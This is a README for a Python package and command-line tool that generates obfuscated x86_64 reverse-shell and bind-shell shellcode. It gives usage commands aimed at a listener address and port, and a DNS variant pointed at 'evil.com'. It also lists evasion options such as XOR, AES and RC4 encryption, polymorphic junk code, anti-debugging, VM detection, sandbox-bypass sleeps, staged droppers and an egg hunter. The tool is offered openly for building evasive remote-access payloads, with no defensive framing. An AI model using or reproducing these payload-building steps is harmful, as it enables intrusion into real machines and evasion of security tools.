# yaptpy

> CLI tool that generates highly obfuscated x86_64 reverse shell shellcode with multiple evasion techniques

[![PyPI](https://img.shields.io/pypi/v/yaptpy.svg)](https://pypi.org/project/yaptpy/)
[![Python](https://img.shields.io/pypi/pyversions/yaptpy.svg)](https://pypi.org/project/yaptpy/)
[![Coverage](https://codecov.io/gh/daedalus/yaptpy/branch/main/graph/badge.svg)](https://codecov.io/gh/daedalus/yaptpy)
[![Ruff](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json)](https://github.com/astral-sh/ruff)

## Install

```bash
pip install yaptpy
```

## Usage

```python
from yaptpy import generate_payload

# Generate basic reverse shell shellcode
shellcode = generate_payload(
    ip="192.168.1.100",
    port=4444,
    executable_path="/bin/sh",
    junk=True,
    anti_emulation=False,
    stack_pivot=False,
    obfuscate_path=False,
    anti_debug=False,
    indirect_syscalls=False,
)
```

## CLI

```bash
yaptpy --help
```

Basic reverse shell:
```bash
yaptpy --ip 192.168.1.100 --port 4444
```

Obfuscated version with multiple techniques:
```bash
yaptpy --ip 192.168.1.100 --port 4444 --junk --obfuscate-path --anti-debug --rle --xor-key 0xAA
```

## Payload Types

### Reverse Shell (default)
```bash
yaptpy --ip 192.168.1.100 --port 4444
```

### Bind Shell
```bash
yaptpy --bind --port 4444 --bind-addr 0.0.0.0
```

### IPv6
```bash
yaptpy --ip 2001:db8::1 --port 4444 --ipv6
```

### DNS Resolution
```bash
yaptpy --dns --domain evil.com
```

## Evasion Techniques

### Encryption
```bash
# XOR encryption
yaptpy --ip 192.168.1.100 --port 4444 --xor-key 0xAA

# Rolling XOR encryption
yaptpy --ip 192.168.1.100 --port 4444 --rolling-xor-key 0x42

# AES-256 encryption
yaptpy --ip 192.168.1.100 --port 4444 --aes-key 0123456789abcdef0123456789abcdef

# RC4 encryption
yaptpy --ip 192.168.1.100 --port 4444 --rc4-key deadbeef
```

### Encoding
```bash
# Base64 encoding
yaptpy --ip 192.168.1.100 --port 4444 --base64

# Base32 encoding
yaptpy --ip 192.168.1.100 --port 4444 --base32

# RLE encoding
yaptpy --ip 192.168.1.100 --port 4444 --rle
```

### Obfuscation
```bash
# Polymorphic junk code
yaptpy --ip 192.168.1.100 --port 4444 --junk

# Enhanced polymorphic engine
yaptpy --ip 192.168.1.100 --port 4444 --polymorphic

# Obfuscate executable path
yaptpy --ip 192.168.1.100 --port 4444 --obfuscate-path

# Indirect syscalls
yaptpy --ip 192.168.1.100 --port 4444 --indirect-syscalls

# Stack pivot
yaptpy --ip 192.168.1.100 --port 4444 --stack-pivot
```

### Anti-Analysis
```bash
# Anti-debugging (ptrace)
yaptpy --ip 192.168.1.100 --port 4444 --anti-debug

# Anti-emulation (rdtsc/cpuid)
yaptpy --ip 192.168.1.100 --port 4444 --anti-emulation

# VM/hypervisor detection
yaptpy --ip 192.168.1.100 --port 4444 --vm-detect

# Parent process check
yaptpy --ip 192.168.1.100 --port 4444 --parent-check

# Sleep evasion (sandbox bypass)
yaptpy --ip 192.168.1.100 --port 4444 --sleep 60
```

### Advanced Payloads
```bash
# Egg hunter
yaptpy --egg-hunter --egg deadbeef

# Staged payload (dropper)
yaptpy --ip 192.168.1.100 --port 4444 --staged
```

## API

### Payload Generation

#### `generate_payload(...) -> bytes`
Generates core reverse shell payload with optional features.

#### `egg_hunter(egg: bytes) -> bytes`
Generates egg hunter shellcode.

#### `generate_bind_shell(port: int, bind_addr: str) -> bytes`
Generates bind shell shellcode.

#### `generate_ipv6_reverse_shell(ipv6_addr: str, port: int) -> bytes`
Generates IPv6 reverse shell shellcode.

#### `generate_dns_resolve(domain: str) -> bytes`
Generates DNS resolution payload.

#### `generate_staged_payload(stage1_size: int) -> tuple[bytes, bytes]`
Generates staged payload (stage1 and stage2).

### Encryption Functions

#### `xor_encrypt(data: bytes, key: int) -> bytes`
Encrypts data using simple byte-wise XOR.

#### `rolling_xor_encrypt(data: bytes, key: int) -> bytes`
Encrypts data using rolling XOR (key increments).

#### `base64_encode(data: bytes) -> bytes`
Encodes data using Base64.

#### `base32_encode(data: bytes) -> bytes`
Encodes data using Base32.

#### `aes_encrypt(data: bytes, key: bytes) -> bytes`
Encrypts data using AES-CBC.

#### `rc4_encrypt(data: bytes, key: bytes) -> bytes`
Encrypts data using RC4 stream cipher.

### Evasion Functions

#### `generate_sleep_evasion(sleep_seconds: int) -> bytes`
Generates sleep evasion code for sandbox bypass.

#### `generate_vm_detection() -> bytes`
Generates VM/hypervisor detection code.

#### `generate_parent_check() -> bytes`
Generates parent process check code.

### Obfuscation Functions

#### `substitute_instructions(asm_code: str) -> str`
Applies instruction substitution obfuscation.

#### `transposed_code(asm_lines: list[str]) -> list[str]`
Applies code transposition obfuscation.

#### `call_preceded_obfuscation(syscall_num: int) -> bytes`
Applies call-preceded syscall obfuscation.

#### `syscall_splitting(syscall_num: int) -> bytes`
Applies syscall splitting obfuscation.

#### `enhanced_polymorphic_engine(shellcode: bytes, junk_ratio: float) -> bytes`
Applies enhanced polymorphic obfuscation to shellcode.

### Utility Functions

#### `api_hash(syscall_name: str) -> int`
Computes API hash for syscall resolution.

#### `generate_polymorphic_junk() -> bytes`
Generates random non-functional assembly instructions.

#### `remove_comments_from_assembly(assembly_code: str) -> str`
Removes comments from assembly code.

#### `rle_decoder_stub(original_size: int) -> bytes`
Generates RLE decoder stub.

#### `rolling_xor_decoder_stub(original_size: int, start_key: int) -> bytes`
Generates rolling XOR decoder stub.

## Development

```bash
git clone https://github.com/daedalus/yaptpy.git
cd yaptpy
pip install -e ".[test]"

# run tests
pytest

# format
ruff format src/ tests/

# lint
ruff check src/ tests/

# type check
mypy src/
```

## License

MIT
